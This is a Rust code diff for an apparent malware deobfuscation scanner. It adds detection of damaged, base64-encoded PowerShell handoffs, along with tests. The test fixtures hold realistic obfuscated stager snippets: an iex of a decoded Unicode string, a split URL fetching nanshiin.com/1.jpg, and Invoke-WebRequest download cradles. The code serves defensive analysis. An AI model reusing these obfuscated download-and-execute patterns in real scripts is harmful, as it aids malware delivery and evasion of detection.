@@ -6500,6 +6500,30 @@ Invoke-WebRequest -Uri $links[0] -OutFile stage.bin
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn damaged_powershell_handoff_with_control_bytes_queues_decoded_ps1() {
+        let decoded = "Start-Sleep -Seconds 3;$Bytes='ht';$Bytes2='tps://';$base=$Bytes+$Bytes2;$links=@(($base+'nanshiin.com/1.jpg'))";
+        let utf16: Vec<u8> = decoded
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD
+            .encode(&utf16)
+            .replacen('r', "f#", 1);
+        let script = format!(
+            "\u{2}\u{3}hell \"$ddsdgo \0'{b64}'; iex([Text.Encoding]::Unicode.GetString([Convert]::Fromba\0e\004\0\0( $ddsdgo\u{2}replace('f#','r') )))\"",
+        );
+        let mut env = crate::Environment::new(&Config::default());
+        crate::pre_scan_damaged_powershell_handoff(script.as_bytes(), &mut env);
+        assert!(
+            env.all_extracted_ps1
+                .iter()
+                .any(|payload| { String::from_utf8_lossy(payload).contains("nanshiin.com/1.jpg") }),
+            "damaged handoff did not queue decoded PS1: {:?}",
+            env.all_extracted_ps1
+        );
+    }
 }
 
 #[cfg(test)]
@@ -6823,6 +6847,135 @@ fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool
     false
 }
 
+fn pre_scan_damaged_powershell_handoff(input: &[u8], env: &mut Environment) {
+    use base64::Engine;
+
+    let text = String::from_utf8_lossy(input);
+    if !crate::util::contains_ascii_case_insensitive(&text, "getstring")
+        || !crate::util::contains_ascii_case_insensitive(&text, "replace")
+    {
+        return;
+    }
+    let Some((needle, replacement)) = first_literal_replace_pair(&text) else {
+        return;
+    };
+    for literal in quoted_base64ish_literals(&text) {
+        let repaired = literal.replace(&needle, &replacement);
+        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(repaired) else {
+            continue;
+        };
+        let decoded = decode_likely_powershell_payload(&decoded);
+        if !looks_like_extracted_powershell(&decoded)
+            && !crate::util::contains_ascii_case_insensitive(&decoded, "download")
+            && !crate::util::contains_ascii_case_insensitive(&decoded, "http://")
+            && !crate::util::contains_ascii_case_insensitive(&decoded, "https://")
+            && !decoded.contains('$')
+        {
+            continue;
+        }
+        push_unique_payload(&mut env.all_extracted_ps1, decoded.into_bytes());
+    }
+}
+
+fn first_literal_replace_pair(text: &str) -> Option<(String, String)> {
+    let mut cursor = 0usize;
+    while let Some(pos) = crate::util::find_ascii_case_insensitive_from(text, "replace", cursor) {
+        let mut idx = pos + "replace".len();
+        idx = skip_ascii_ws_str(text, idx);
+        if text.as_bytes().get(idx) != Some(&b'(') {
+            cursor = idx;
+            continue;
+        }
+        idx += 1;
+        idx = skip_ascii_ws_str(text, idx);
+        let (needle, next) = parse_simple_quoted_arg(text, idx)?;
+        idx = skip_ascii_ws_str(text, next);
+        if text.as_bytes().get(idx) != Some(&b',') {
+            cursor = idx;
+            continue;
+        }
+        idx = skip_ascii_ws_str(text, idx + 1);
+        let (replacement, _) = parse_simple_quoted_arg(text, idx)?;
+        return Some((needle, replacement));
+    }
+    None
+}
+
+fn quoted_base64ish_literals(text: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    let bytes = text.as_bytes();
+    let mut idx = 0usize;
+    while idx < bytes.len() {
+        if bytes[idx] != b'\'' && bytes[idx] != b'"' {
+            idx += 1;
+            continue;
+        }
+        let quote = bytes[idx];
+        let start = idx + 1;
+        let mut end = start;
+        while end < bytes.len() && bytes[end] != quote {
+            end += 1;
+        }
+        if end > start {
+            let candidate = &text[start..end];
+            if candidate.len() >= 40
+                && candidate
+                    .bytes()
+                    .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'#'))
+            {
+                out.push(candidate.to_string());
+                idx = end.saturating_add(1);
+                continue;
+            }
+        }
+        idx = start;
+    }
+    out
+}
+
+fn parse_simple_quoted_arg(text: &str, idx: usize) -> Option<(String, usize)> {
+    let quote = *text.as_bytes().get(idx)?;
+    if quote != b'\'' && quote != b'"' {
+        return None;
+    }
+    let start = idx + 1;
+    let mut end = start;
+    while end < text.len() && text.as_bytes().get(end) != Some(&quote) {
+        end += 1;
+    }
+    (end < text.len()).then(|| (text[start..end].to_string(), end + 1))
+}
+
+fn skip_ascii_ws_str(text: &str, mut idx: usize) -> usize {
+    while text
+        .as_bytes()
+        .get(idx)
+        .is_some_and(|byte| byte.is_ascii_whitespace())
+    {
+        idx += 1;
+    }
+    idx
+}
+
+fn decode_likely_powershell_payload(decoded: &[u8]) -> String {
+    if decoded.len() >= 4 && decoded.len() % 2 == 0 {
+        let odd_zeroes = decoded
+            .iter()
+            .skip(1)
+            .step_by(2)
+            .filter(|byte| **byte == 0)
+            .count();
+        if odd_zeroes * 2 >= decoded.len() / 2 {
+            let u16s: Vec<u16> = decoded
+                .chunks_exact(2)
+                .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
+                .collect();
+            return String::from_utf16_lossy(&u16s);
+        }
+    }
+    String::from_utf8_lossy(decoded).into_owned()
+}
+
 fn decode_utf16le_script_blob(input: &[u8]) -> Option<String> {
     /// Hard cap on attacker-supplied UTF-16LE blob size. Without this, a
     /// library consumer (the CLI applies its own input cap but downstream
@@ -6985,6 +7138,7 @@ fn analyze_inner(
     }
     pre_scan_polyglot_script_block(input, &mut env);
     let standalone_script_input = pre_scan_standalone_script_input(input, &mut env);
+    pre_scan_damaged_powershell_handoff(input, &mut env);
     deob_scan::scan_raw_marker_powershell_urls(input, &mut env);
     if looks_like_pe(input) {
         env.traits.push(Trait::DisguisedBinary {
@@ -21679,6 +21833,22 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js.example/p")"#,
         assert!(!crate::contains_ascii_case_insensitive_bytes(
             b"echo just a batch file",
             b"createobject"
+        ));
+    }
+
+    #[test]
+    fn ascii_case_insensitive_byte_gate_matches_script_tags() {
+        assert!(crate::contains_ascii_case_insensitive_bytes(
+            b"/* <SCRIPT language=\"JScript\"> */",
+            b"<script"
+        ));
+        assert!(crate::contains_ascii_case_insensitive_bytes(
+            b"</ScRiPt>",
+            b"</script>"
+        ));
+        assert!(!crate::contains_ascii_case_insensitive_bytes(
+            b"echo no embedded script here",
+            b"<script"
         ));
     }
 
